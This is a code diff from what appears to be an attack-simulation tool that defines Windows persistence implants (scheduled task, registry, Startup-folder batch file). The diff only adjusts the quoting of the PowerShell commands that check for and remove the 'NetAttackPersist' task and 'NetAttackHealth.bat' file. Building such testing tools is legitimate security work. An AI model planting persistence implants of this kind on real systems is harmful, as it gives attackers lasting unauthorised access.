@@ -15,7 +15,6 @@ callback_host — no third-party hosts.
 
 from __future__ import annotations
 
-import os
 import shlex
 from dataclasses import dataclass
 
@@ -225,8 +224,8 @@ except Exception as e:
 print(json.dumps(results))
 print("PERSISTENCE_INSTALLED: schtask")
 """,
-    verify_cmd="powershell -NoProfile -Command \"Get-ScheduledTask -TaskName NetAttackPersist -ErrorAction SilentlyContinue | Format-List TaskName,State; schtasks /query /tn NetAttackPersist 2>&1\"",
-    remove_cmd="powershell -NoProfile -Command \"Unregister-ScheduledTask -TaskName NetAttackPersist -Confirm:$false -ErrorAction SilentlyContinue; schtasks /delete /tn NetAttackPersist /f 2>&1\"; echo REMOVED",
+    verify_cmd='powershell -NoProfile -Command "Get-ScheduledTask -TaskName NetAttackPersist -ErrorAction SilentlyContinue | Format-List TaskName,State; schtasks /query /tn NetAttackPersist 2>&1"',
+    remove_cmd='powershell -NoProfile -Command "Unregister-ScheduledTask -TaskName NetAttackPersist -Confirm:$false -ErrorAction SilentlyContinue; schtasks /delete /tn NetAttackPersist /f 2>&1"; echo REMOVED',
 )
 
 _WIN_REGISTRY = ImplantSpec(
@@ -312,8 +311,8 @@ except Exception as e:
 print(json.dumps(results))
 print("PERSISTENCE_INSTALLED: startup")
 """,
-    verify_cmd="powershell -NoProfile -Command \"Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" | Where-Object { $_.Name -like '*NetAttack*' } | Format-List Name,FullName\"",
-    remove_cmd="powershell -NoProfile -Command \"Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NetAttackHealth.bat\" -Force -ErrorAction SilentlyContinue\"; echo REMOVED",
+    verify_cmd='powershell -NoProfile -Command "Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" | Where-Object { $_.Name -like \'*NetAttack*\' } | Format-List Name,FullName"',
+    remove_cmd='powershell -NoProfile -Command "Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NetAttackHealth.bat" -Force -ErrorAction SilentlyContinue"; echo REMOVED',
 )
 
 # --- Web implants -------------------------------------------------------------
